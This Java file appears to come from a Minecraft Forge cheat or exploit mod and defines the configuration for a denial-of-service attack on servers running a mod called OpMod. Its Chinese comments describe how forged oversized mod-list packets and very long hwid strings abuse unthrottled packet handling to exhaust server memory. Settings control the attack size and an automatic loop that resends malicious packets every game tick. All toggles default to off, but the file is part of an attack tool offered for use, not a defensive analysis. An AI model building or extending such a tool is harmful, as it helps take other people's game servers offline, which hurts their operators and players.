package fku.org.example.fku.config; /* water */

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;

import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;

/**
 * OpMod 服务端 DoS 漏洞利用配置。
 *
 * 位置：游戏根目录 / fku / exploits / opmod_dos.json
 * 默认全部关闭。手动将对应项改为 true 才会生效（攻击在 mod 加载/游戏循环阶段触发，无 GUI 开关）。
 *
 * 两个攻击对应 opmod 的两个未做节流的发包链路：
 *   1) modListAttack —— 伪造超巨大的 mod 列表包（size 与单条长度可配），
 *      服务端 decode 按客户端自报 size 预分配几十 MB 的 TreeSet，并每个包入主线程队列做差集 + 全服广播。
 *   2) hwidAttack    —— 伪造超长 hwid 字符串（长度可配，默认 32767 字节上限），高频 put 进服务端 Map。
 *
 * loopEnabled + loopPerTick 控制是否由客户端游戏循环高频自动重发恶意包（模拟每秒数千个包）。
 */
public class OpmodDosConfig {
    private static final Gson GSON = new GsonBuilder().setPrettyPrinting().create();
    private static OpmodDosConfig instance;

    // ===== 主开关（默认全部关闭）=====
    public boolean modListAttack = false;   // 巨型 mod 列表攻击
    public boolean hwidAttack = false;      // 超长 hwid 攻击
    public boolean loopEnabled = false;     // 客户端循环高频发包
    public int loopPerTick = 50;            // 每个游戏 tick 发送的恶意包数量

    // ===== modListAttack 参数 =====
    public int modListSize = 100000;        // 自报的 mod 数量（服务端按此预分配）
    public int modListStringLen = 64;       // 每个 modId 字符串的长度

    // ===== hwidAttack 参数 =====
    public int hwidLen = 32767;             // hwid 字符串长度（Forge readUtf 默认上限）

    private static File getConfigFile() {
        File configDir = new File(getGameDirectory(), "fku");
        File exploitsDir = new File(configDir, "exploits");
        if (!exploitsDir.exists()) {
            exploitsDir.mkdirs();
        }
        return new File(exploitsDir, "opmod_dos.json");
    }

    private static File getGameDirectory() {
        try {
            return net.minecraftforge.fml.loading.FMLPaths.GAMEDIR.get().toFile();
        } catch (Throwable t) {
            return new File(".");
        }
    }

    public static OpmodDosConfig getInstance() {
        if (instance == null) {
            load();
        }
        return instance;
    }

    public static void load() {
        File configFile = getConfigFile();
        if (configFile.exists()) {
            try (FileReader reader = new FileReader(configFile)) {
                instance = GSON.fromJson(reader, OpmodDosConfig.class);
            } catch (Exception e) {
                instance = new OpmodDosConfig();
                save();
            }
        } else {
            instance = new OpmodDosConfig();
            save();
        }
    }

    public static void save() {
        if (instance == null) {
            instance = new OpmodDosConfig();
        }
        File configFile = getConfigFile();
        try (FileWriter writer = new FileWriter(configFile)) {
            GSON.toJson(instance, writer);
        } catch (Exception ignored) {
        }
    }
}
